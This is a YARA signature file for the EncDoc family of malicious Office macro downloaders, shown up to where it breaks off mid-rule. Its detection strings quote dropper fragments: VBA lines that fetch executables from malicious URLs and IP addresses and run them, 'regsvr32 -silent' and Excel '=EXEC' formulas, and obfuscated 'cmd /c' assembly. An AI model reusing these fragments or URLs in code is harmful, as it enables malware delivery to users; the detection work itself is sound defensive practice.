rule TrojanDownloader_O97M_EncDoc_A_2147742853_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.A!MTB"
        threat_id = "2147742853"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {57 69 6e 48 74 74 70 52 65 71 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 31 30 22 20 26 20 22 34 2e 32 34 34 2e 22 20 26 20 22 37 34 2e 32 34 33 2f [0-2] 2e 6a 70 67 22 2c 20 46 61 6c 73 65}  //weight: 10, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 41 70 70 2e 4f 70 65 6e 20 45 6e 76 69 72 6f 6e 28 22 54 4d 50 22 29 20 2b 20 22 5c 74 65 6d [0-1] 70 65 72 7a 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {6f 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 28 45 6e 76 69 72 6f 6e 28 22 54 4d 50 22 29 20 2b 20 22 5c [0-8] 2e 65 78 65 22 29 2c 20 56 61 6c 28 32 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Set ShellApp = CreateObject(\"shell.application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_C_2147743601_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.C!MTB"
        threat_id = "2147743601"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 69 6e 48 74 74 70 52 65 71 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 22 20 26 20 22 32 30 39 2e 31 34 31 2e 34 32 2e 32 33 2f [0-32] 2e 6a 70 67 22 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 45 6e 76 69 72 6f 6e 28 22 54 4d 50 22 29 20 2b 20 22 5c [0-32] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = "ShellApp.Open" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_D_2147744707_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.D!MTB"
        threat_id = "2147744707"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pyvjHfGNT = pyvjHfGNT + 0.40989414976 * Sgn(1.48302034194 + 26087.9031415742 * OaXvbJJ9I7n)" ascii //weight: 1
        $x_1_2 = "(\"wscript //nologo c:\\winlogs\\debug.vbs https://angel.ac.nz/wp-content/uploads/2019/10/THEBRKMZ.ocx c:\\winlogs\\oly_debug2.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_E_2147745553_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.E!MTB"
        threat_id = "2147745553"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 74 43 6f 6f 6c 4d 6f 6d 20 3d 20 52 74 43 6f 6f 6c 4d 6f 6d 20 2b 20 [0-21] 20 2a 20 53 67 6e 28 [0-21] 20 2b 20 [0-24] 20 2a 20 41 73 73 69 74 65 6e 74 73 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 22 77 73 63 72 69 70 74 20 2f 2f 6e 6f 6c 6f 67 6f 20 63 3a 5c 43 6f 6c 6f 72 66 6f 6e 74 73 33 32 5c 76 69 73 69 74 63 61 72 64 2e 76 62 73 20 68 74 74 70 [0-1] 3a 2f 2f 77 77 77 2e [0-24] 2e 63 6f 6d 2f [0-112] 2e 62 69 6e 20 63 3a 5c 43 6f 6c 6f 72 66 6f 6e 74 73 33 32 5c [0-16] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"|\" & B & \"|\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ARJ_2147750217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ARJ!MTB"
        threat_id = "2147750217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://nonnewspaper.com/bot.dll" ascii //weight: 1
        $x_1_2 = "https://crypetunia.com/crypt.dll" ascii //weight: 1
        $x_1_3 = "http://205.185.122.246/w21dxM" ascii //weight: 1
        $x_1_4 = "http://209.141.54.161/3.bin" ascii //weight: 1
        $x_1_5 = "http://invoice7mukszq9nbpa7online.ru/cirkumfleks.exe" ascii //weight: 1
        $x_1_6 = "http://zegyn.com/mzpqosjf.exe" ascii //weight: 1
        $x_1_7 = "http://risweg.com/flpaoql.exe" ascii //weight: 1
        $x_1_8 = "http://luyitaw.com/okasle.exe" ascii //weight: 1
        $x_1_9 = "http://asdjgkfwsas.com/plkdmc.exe" ascii //weight: 1
        $x_1_10 = "http://194.5.249.107/2NquxQZ2oK4a45L.php" ascii //weight: 1
        $x_1_11 = "http://185.180.197.66/2VJDZ6JaqzEiq.php" ascii //weight: 1
        $x_1_12 = "http://185.99.2.83/fRTe1z0xiWu8q.php" ascii //weight: 1
        $x_1_13 = "http://94.140.115.48/Wg4NI94598qBF.php" ascii //weight: 1
        $x_1_14 = "http://45.11.183.78/6f04e0be46qb4Zc.php" ascii //weight: 1
        $x_1_15 = "http://198.46.198.105/q6pdJ3l7Yq2W.php" ascii //weight: 1
        $x_1_16 = "http://rocesi.com/mncejd.exe" ascii //weight: 1
        $x_1_17 = "http://guruofbullet.xyz/mncejd.exe" ascii //weight: 1
        $x_1_18 = "https://www.victoria-view.com/view/locomokonew.php" ascii //weight: 1
        $x_1_19 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_20 = "JJCCCCJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_F_2147750677_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.F!MTB"
        threat_id = "2147750677"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 41 70 70 2e 4f 70 65 6e 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 2b 20 22 5c [0-18] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = "WinHttpReq.Open \"GET\", \"http://199.19.226.33/drop.bin\", False" ascii //weight: 1
        $x_1_3 = "Magic word not found?! is he already dead?" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_H_2147753008_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.H!MTB"
        threat_id = "2147753008"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\OcKbNSr.exe" ascii //weight: 1
        $x_1_2 = "C:\\ProgramData\\MIwRHxM.exe" ascii //weight: 1
        $x_1_3 = "C:\\ProgramData\\zvjEulz.exe" ascii //weight: 1
        $x_1_4 = "C:\\ProgramData\\ecWolIe.dll" ascii //weight: 1
        $x_1_5 = "C:\\ProgramData\\cswzqQf.exe" ascii //weight: 1
        $x_1_6 = "C:\\ProgramData\\gfHoGrv.exe" ascii //weight: 1
        $x_1_7 = "C:\\ProgramData\\hmXQXCP.exe" ascii //weight: 1
        $x_1_8 = "C:\\ProgramData\\kfUofWk.exe" ascii //weight: 1
        $x_1_9 = "C:\\ProgramData\\KGuPFvK.exe" ascii //weight: 1
        $x_1_10 = "C:\\ProgramData\\MHvQHxL.exe" ascii //weight: 1
        $x_1_11 = "C:\\ProgramData\\hdRlcTh.exe" ascii //weight: 1
        $x_1_12 = "C:\\ProgramData\\sodxnes.exe" ascii //weight: 1
        $x_1_13 = "C:\\ProgramData\\MRCuDgt.exe" ascii //weight: 1
        $x_1_14 = "C:\\ProgramData\\zvkFulz.exe" ascii //weight: 1
        $x_1_15 = "C:\\ProgramData\\FBpKzqF.exe" ascii //weight: 1
        $x_1_16 = "C:\\ProgramData\\NwvjVwT.exe" ascii //weight: 1
        $x_1_17 = "C:\\ProgramData\\lhWqhYl.exe" ascii //weight: 1
        $x_1_18 = "C:\\ProgramData\\plaukbp.exe" ascii //weight: 1
        $x_1_19 = "C:\\ProgramData\\zOvNyDd.exe" ascii //weight: 1
        $x_1_20 = "C:\\ProgramData\\PNHZWsP.exe" ascii //weight: 1
        $x_1_21 = "C:\\ProgramData\\GCqLBrG.exe" ascii //weight: 1
        $x_1_22 = "C:\\ProgramData\\bWLfWNa.exe" ascii //weight: 1
        $x_1_23 = "C:\\ProgramData\\yujEuky.exe" ascii //weight: 1
        $x_1_24 = "C:\\ProgramData\\eaPjZQe.exe" ascii //weight: 1
        $x_1_25 = "C:\\ProgramData\\ZVKeULZ.exe" ascii //weight: 1
        $x_1_26 = "C:\\ProgramData\\MIwRIxM.exe" ascii //weight: 1
        $x_1_27 = "C:\\ProgramData\\xEzMPdz.exe" ascii //weight: 1
        $x_1_28 = "C:\\vsnFDZu\\TZVhkyV\\WfpkOdv.ex" ascii //weight: 1
        $x_1_29 = "C:\\scbPBcy\\LZHYKOo\\jeTneVi.exe" ascii //weight: 1
        $x_1_30 = "C:\\oyThUHh\\EDfNeQU\\FoWYtWa.exe" ascii //weight: 1
        $x_1_31 = "C:\\WFFseGc\\oDkCnrS\\MIwRIyM.exe" ascii //weight: 1
        $x_1_32 = "C:\\purDGVq\\rBLGjyS\\RPJbYuQ.exe" ascii //weight: 1
        $x_1_33 = "C:\\FnmaMnK\\WkSjWaz\\upeypgt.exe" ascii //weight: 1
        $x_1_34 = "C:\\KQMXapL\\MVfaETm\\ljdvsPl.exe" ascii //weight: 1
        $x_1_35 = "C:\\sxibiNa\\ZpsvnMb\\CVPFktt.exe" ascii //weight: 1
        $x_1_36 = "C:\\RzzmZzW\\jxfwimM\\HDrMCsH.exe" ascii //weight: 1
        $x_1_37 = "C:\\DmlZLmJ\\VjRiUYy\\todxofs.exe" ascii //weight: 1
        $x_1_38 = "C:\\ProgramData\\kgVpfWk.exe" ascii //weight: 1
        $x_1_39 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_40 = "ShellExecuteA" ascii //weight: 1
        $x_1_41 = "URLMON" ascii //weight: 1
        $x_1_42 = "Kernel32" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://fourstars.cyou/1.php" ascii //weight: 1
        $x_1_2 = "\\91919.dll" ascii //weight: 1
        $x_1_3 = "URLMon" ascii //weight: 1
        $x_1_4 = "ownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\rmbvmdq.exe" ascii //weight: 1
        $x_1_2 = "URLMON" ascii //weight: 1
        $x_1_3 = "ShellExecuteA" ascii //weight: 1
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(\"https://staging.gaiafacturacion.com/produccion/v4/include/lib/phpqrcode/cache/rzkNuqp6m1hoY.php" ascii //weight: 1
        $x_1_2 = "= Replace(\"Wscript.Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set qDwIfDBqY = lcCrJ.OpenTextFile(OTDZ + \"\\nRSdr.vbs\", 8, True)" ascii //weight: 1
        $x_1_2 = "EndTick = GetTickCount + (Finish * 1000)" ascii //weight: 1
        $x_1_3 = "OTDZ = Environ$(\"AppData\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set Piqp = CreateObject(n1)" ascii //weight: 1
        $x_1_2 = "Piqp.ShellExecute \"P\" + Cells(7, 1), fjdfk(A2), \"\", \"\", 0" ascii //weight: 1
        $x_1_3 = "PJcVtz = Right(Left(goFgzcE, kk), 2 - 1) & bvgBIcJug" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open bay4egtkajsyugi.Sjs5reSdrtyd(\"egasw\", \"tyer\", 76) For Output As #1" ascii //weight: 1
        $x_1_2 = ".CreateObject(Sjs5reSdrtyd(\"dfeWEtarasd\", \"dsfswetrTErtwerRe\", 82), \"\").Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://cortinastelasytrazos.com/Yro6Atvj/sec.html" ascii //weight: 1
        $x_1_2 = "https://orquideavallenata.com/4jmDb0s9sg/sec.html" ascii //weight: 1
        $x_1_3 = "https://fundacionverdaderosheroes.com/gY0Op5Jkht/sec.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set Vd1AUR2eW = CreateObject(hGFysGF)" ascii //weight: 1
        $x_1_2 = {2e 50 61 74 74 65 72 6e 20 3d 20 22 6a 7c 71 7c 55 7c 76 7c 4d 7c 4f 7c 58 7c 7a 7c 44 7c 48 7c 5a 7c 56 7c 50 7c 51 7c 59 7c 49 7c 4e 7c 77 7c 4b 7c 4c 22 [0-7] 2e 47 6c 6f 62 61 6c 20 3d 20 54 72 75 65 [0-7] 45 6e 64 20 57 69 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = "YYImycMg = Vd1AUR2eW.Replace(B2XkKkUph(0), \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "http://sportbettingdubuque.com/512.dll" ascii //weight: 2
        $x_1_2 = "URLMON" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "ShellExecuteA" ascii //weight: 1
        $x_1_5 = "C:\\LtsgStQ\\cqYpbgG" ascii //weight: 1
        $x_1_6 = "CreateDirectoryA" ascii //weight: 1
        $x_1_7 = "DownloadFile" ascii //weight: 1
        $x_1_8 = "zpguFnnaNnKXD" ascii //weight: 1
        $x_1_9 = "lTkWazolfxuR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Run ((((((tg_Tan(\"\" & \"E\" & pko, \"\", \"\"))" ascii //weight: 1
        $x_1_2 = "= Split(\"\" & jEee, \"V\")" ascii //weight: 1
        $x_1_3 = ".Formula = tg_Tan(c, Kio, Sma)" ascii //weight: 1
        $x_1_4 = ".Formula = \"=\" & \"R\" & \"E\" & NJ & \"RN(\" & \")" ascii //weight: 1
        $x_1_5 = "tg_Tan = Replace(yy, kk, i)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-3] 62 71 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 74 6f 54 6f 43 6f 6d 70 61 72 65 2e 68 74 61 22 2c 20 22 64 20 2f 63 20 22 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #1, Replace(ActiveDocument.Range.Text, \"x50c\", \"\")" ascii //weight: 1
        $x_1_3 = "Shell \"cm\" & htmlCompareI & compareToComps" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ") = \"JJCCBB" ascii //weight: 1
        $x_1_2 = ") = \"regsvr32 -silent ..\\Dertyht.dll\"" ascii //weight: 1
        $x_1_3 = ") = \"=REGISTER(I9,I10&J10,I11,I12,,1,9)" ascii //weight: 1
        $x_1_4 = ") = \"=EXEC(I17)" ascii //weight: 1
        $x_1_5 = {20 4d 73 67 42 6f 78 20 22 54 68 69 73 20 57 6f 72 6b 62 6f 6f 6b [0-21] 20 72 65 71 75 69 72 65 73 20 45 78 63 65 6c 20 32 30 30 37 20 6f 72 20 6c 61 74 65 72 21 22 2c 20 76 62 43 72 69 74 69 63 61 6c 2c 20 22 43 6c 6f 73 69 6e 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://ricardopiresfotografia.com/RpuaNlWy/\"&\"host.html" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"p\"&\"s://keysite.com.co/IQ3mbS6EF/\"&\"host.html" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"p\"&\"s://colegiobilinguepioxii.com.co/SYqvKoF4/\"&\"host.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 73 20 2b 20 22 76 5c 6c 6c 65 68 53 72 65 77 6f 50 73 77 6f 64 6e 69 57 5c 32 33 6d 65 74 73 79 53 5c 73 77 6f 64 6e 69 57 5c 3a 43 22 [0-7] 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 73 29}  //weight: 1, accuracy: Low
        $x_1_2 = "bat = \"Bqzazthpkhjgkygrz.bat" ascii //weight: 1
        $x_1_3 = "text = Prefix1() + Prefix3() + Prefix2()" ascii //weight: 1
        $x_1_4 = "Open bat For Output As #1" ascii //weight: 1
        $x_1_5 = {64 20 3d 20 53 68 65 6c 6c 28 62 61 74 2c 20 30 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"bireCbire:bire\\PbirerobiregrbireamDbireatbirea\\fbirehkjd.bbireat" ascii //weight: 1
        $x_1_2 = "= jgflk4(UserForm1.TextBox2.Tag, \"bire\")" ascii //weight: 1
        $x_1_3 = "hksuttksupsksu:ksu/ksu/fksuabricsdiksurect4yksuou.coksum/wksup-cksuonksutenksut/ksuuploaksuds/2ksu021/0ksu9/1.dksull" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "okiea = Split(ki, \"sjdjriWadjnrncjr\")" ascii //weight: 1
        $x_1_2 = "sdjjsd = Join(okiea, \"\") + Space(1) & String(1, \"p\") + Replace(\"imgoingtokillsje\", \"imgoingtokillsje\", \"rocess\")" ascii //weight: 1
        $x_1_3 = "kssj = Split(djaj, \"dajfjedancejdjf\")" ascii //weight: 1
        $x_1_4 = "rich = \"\"\"\" + \"cm\" + String(1, \"d\") & Space(1) + \"/c \" + Malo9 & Malo10 & Malo11 & Malo12 +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
